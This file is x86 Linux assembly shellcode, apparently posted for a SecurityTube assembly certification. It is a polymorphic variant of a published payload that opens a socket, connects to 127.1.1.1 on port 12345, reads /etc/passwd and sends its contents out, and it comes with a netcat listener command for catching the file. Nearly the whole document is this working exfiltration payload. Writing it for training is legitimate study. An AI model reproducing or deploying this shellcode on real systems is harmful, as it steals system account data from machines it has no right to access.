; orig shellcode: http://shell-storm.org/shellcode/files/shellcode-861.php
; morphed version by Sandro "guly" Zaccarini
; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
  ; socket
  xor eax,eax
  push eax
  inc eax
  mov ebx,eax
  push eax
  inc eax
  push eax
  mov ecx,esp

  add al,0x64
  ;i'm using this to save 0x66 for next call
  mov edi,eax

  int 0x80
  mov esi, eax

  ; connect
  mov eax,edi
  inc ebx
  push DWORD 0x0101017f  ;127.1.1.1
  push WORD 0x3930  ; Port 12345
  push bx
  mov ecx, esp
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp
  inc ebx
  int 0x80

  ; dup2
  mov esi, eax
  xchg ecx,edx
  inc ecx
  mov BYTE al, 0x3F
  int 0x80

  ;read the file
  jmp short call_shellcode

; read and send
shellcode:
  ; open
  inc ebx
  inc ebx
  mov eax,ebx
  mov ecx,esi
  pop ebx
  int 0x80

  ; read
  mov ebx,eax
  mov al,0x3
  mov edi,eax
  mov ecx,esp
  int 0x80

  ; write
  mov edx,eax
  mov eax,edi
  inc eax
  mov bl, 0x1
  int 0x80

  ; exit
  mov eax,ebx
  inc ebx
  int 0x80

call_shellcode:
  call shellcode
  message db "/etc/passwd"
; total save: 7 bytes
;
; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
